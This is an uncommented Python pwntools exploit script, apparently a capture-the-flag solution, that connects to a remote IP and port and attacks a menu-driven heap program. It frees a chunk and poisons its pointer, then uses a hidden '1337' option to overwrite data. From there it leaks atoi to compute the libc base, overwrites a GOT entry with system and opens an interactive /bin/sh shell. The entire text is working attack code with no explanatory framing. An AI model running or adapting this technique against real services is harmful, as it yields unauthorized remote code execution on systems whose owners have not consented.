from pwn import *
r=remote('51.68.189.144',31005)
#context(log_level='debug')
libc=ELF('./libc.so.6')
r.readuntil('>')
def create():
	r.sendline('1')
	r.readuntil('>')
def dele():
	r.sendline('4')
	r.readuntil('>')	
def edit(a):
	r.sendline('2')
	r.readuntil('Content?')
	r.send(a)
	r.readuntil('>')
def gift(a):
	r.sendline('1337')
	r.readuntil('Fill')
	r.send(a)
	r.readuntil('>')
create()
dele()

edit(p64(0x602095-8))
create()
gift('/bin/sh'+chr(0)+'a'*0x33+p64(0x602060)[0:3])

r.sendline('3')
r.readuntil(': ')
libc_base=u64(r.readuntil('\n')[:-1].ljust(8,chr(0)))-libc.symbols['atoi']
print "libc_base:"+str(libc_base)
oneget=libc_base+libc.symbols['system']
edit(p64(oneget))

print hex(oneget)
r.send('/bin/sh')
r.interactive()
